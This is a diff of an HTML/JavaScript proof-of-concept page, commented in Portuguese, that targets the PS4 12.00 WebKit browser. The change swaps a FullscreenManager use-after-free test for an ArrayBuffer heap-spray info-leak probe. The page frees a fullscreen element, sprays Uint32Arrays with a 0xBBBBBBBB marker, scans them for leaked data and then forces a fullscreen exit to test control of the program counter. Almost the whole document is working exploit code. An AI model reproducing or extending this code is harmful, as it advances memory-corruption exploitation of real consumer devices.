@@ -2,26 +2,26 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - FullscreenManager Leak</title>
+<title>PS4 UAF - ArrayBuffer Overlap Leak</title>
 <style>
-    body { font-family: monospace; background-color: #111; color: #0f0; padding: 20px; font-size: 18px;}
+    body { font-family: monospace; background-color: #111; color: #0f0; padding: 20px; font-size: 16px;}
     #log { margin-top: 20px; white-space: pre-wrap; }
-    .alert { color: #ff3333; font-weight: bold; }
-    .leak { color: #ffff00; font-weight: bold; font-size: 24px;}
+    .leak { color: #ff00ff; font-weight: bold; font-size: 20px;}
 </style>
 </head>
 <body>
 
-<h2>PS4 12.00 - FullscreenManager Leak</h2>
-<button onclick="runTest()" style="padding: 15px; font-size: 18px; cursor: pointer;">Testar Ponteiro do Fullscreen</button>
-<div id="log">Aguardando início...</div>
+<h2>PS4 12.00 - Info Leak via Overlap</h2>
+<button onclick="runTest()" style="padding: 15px; font-size: 16px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0;">Iniciar Varredura de Heap</button>
+<div id="log">Aguardando...</div>
 
 <script>
-const PATTERN = 2.121995791e-314; 
+// Usaremos um marcador bem óbvio em hexadecimal: 0xBBBBBBBB (3149642683 em decimal)
+const MARKER = 3149642683; 
 
 function runTest() {
     const log = document.getElementById("log");
-    log.innerHTML = "Preparando Heap...<br><b>Pressione OPTIONS agora!</b>";
+    log.innerHTML = "Preparando alocações...<br><b>Pressione OPTIONS agora!</b>";
 
     let controllers = [];
 
@@ -33,8 +33,7 @@ function runTest() {
     }
 
     let fsTarget = document.createElement("div");
-    fsTarget.id = "alvo_fullscreen";
-    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Buscando Leaks...<br>Aperte OPTIONS</h1>";
+    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Buscando Overlap...<br>Aperte OPTIONS</h1>";
     fsTarget.style.backgroundColor = "black";
     fsTarget.style.width = "100%";
     fsTarget.style.height = "100%";
@@ -48,52 +47,66 @@ function runTest() {
     }
 
     window.onblur = function() {
-        log.innerHTML += "<br>[*] Foco perdido. Removendo elemento...";
+        log.innerHTML += "<br>[*] Foco perdido. Removendo elemento (Free)...";
 
-        // FORÇA GC
+        // Força GC para limpar o fsTarget
         controllers = null;
         for (let i = 0; i < 20000; i++) {
             new ArrayBuffer(0x10000);
         }
 
-        // Gatilho: Deletamos o alvo
+        // Gatilho do UAF
         fsTarget.remove(); 
         
-        // Spray imediato para envenenar a memória que o FullscreenManager ainda aponta
+        log.innerHTML += "<br>[*] Substituindo memória com Uint32Arrays (Spray)...";
+        
+        // NOVO SPRAY: Em vez de Float64 puros, usamos Uint32Array reais
         let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
+        for(let i = 0; i < 10000; i++) {
+            // Arrays com 16 slots (64 bytes), tamanho comum de objetos de Renderização
+            let p = new Uint32Array(16); 
+            p.fill(MARKER);
             spray.push(p);
         }
 
+        // Esperamos um instante para o WebKit "respirar" e atualizar os ponteiros internos
         setTimeout(() => {
-            log.innerHTML += "<br>[*] Interrogando o FullscreenManager...";
+            log.innerHTML += "<br>[*] Varrendo ArrayBuffers em busca de corrupção...";
             
-            try {
-                // Aqui está a mágica: forçamos o FullscreenManager a ler o ponteiro envenenado
-                let fantasma = document.webkitFullscreenElement || document.fullscreenElement;
-                
-                if (fantasma === null) {
-                    log.innerHTML += `<br><span class="alert">[-] Falha: FullscreenManager retornou null. Ele percebeu a exclusão.</span>`;
-                } else {
-                    log.innerHTML += `<br><span class="leak">[!!!] SUCESSO! O FullscreenManager retornou um objeto!</span>`;
+            let leakEncontrado = false;
+
+            // Inspecionamos todos os nossos Arrays
+            for (let i = 0; i < spray.length; i++) {
+                for (let j = 0; j < spray[i].length; j++) {
+                    let valor = spray[i][j];
                     
-                    // Se chegamos aqui, temos um objeto JS apontando para uma memória que controlamos!
-                    log.innerHTML += `<br>[*] Tentando ler propriedades do fantasma...`;
-                    log.innerHTML += `<br>Tag: ${fantasma.tagName}`;
-                    log.innerHTML += `<br>ID: ${fantasma.id}`;
-                    
-                    // Vamos testar se o objeto fantasma foi corrompido pelo nosso padrão
-                    if (fantasma.id !== "alvo_fullscreen") {
-                        log.innerHTML += `<br><span class="leak">[!!!] INFO LEAK: O objeto está corrompido!</span>`;
+                    // Se o valor não for o nosso MARKER, o WebKit escreveu por cima!
+                    if (valor !== MARKER) {
+                        log.innerHTML += `<br><span class="leak">[!!!] OVERLAP DETECTADO no Array [${i}], Índice [${j}]!</span>`;
+                        log.innerHTML += `<br><span class="leak">[!!!] Valor vazado: 0x${valor.toString(16).padStart(8, '0')}</span>`;
+                        leakEncontrado = true;
+                        
+                        // Quebra o loop interno para não flodar a tela
+                        break; 
                     }
                 }
-                
-            } catch(e) {
-                // Se der crash aqui, a própria leitura da propriedade desencadeia o ponteiro falso
-                log.innerHTML += `<br><span class="alert">[CRASH] Acesso ao webkitFullscreenElement causou falha: ${e}</span>`;
+                if (leakEncontrado) break;
             }
+
+            if (!leakEncontrado) {
+                log.innerHTML += `<br>[-] Nenhum dado C++ vazado nos buffers. A memória permaneceu intacta.`;
+            }
+
+            log.innerHTML += `<br>[*] Forçando a saída do Fullscreen para verificar controle de PC...`;
+            
+            // Agora chamamos a saída do fullscreen. 
+            // Se der tela azul, significa que o WebKit LEU o nosso MARKER e tentou pular para o endereço 0xBBBBBBBB!
+            setTimeout(() => {
+                if (document.webkitIsFullScreen || document.fullscreenElement) {
+                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+                }
+            }, 2000);
+
         }, 1500);
     };
 }
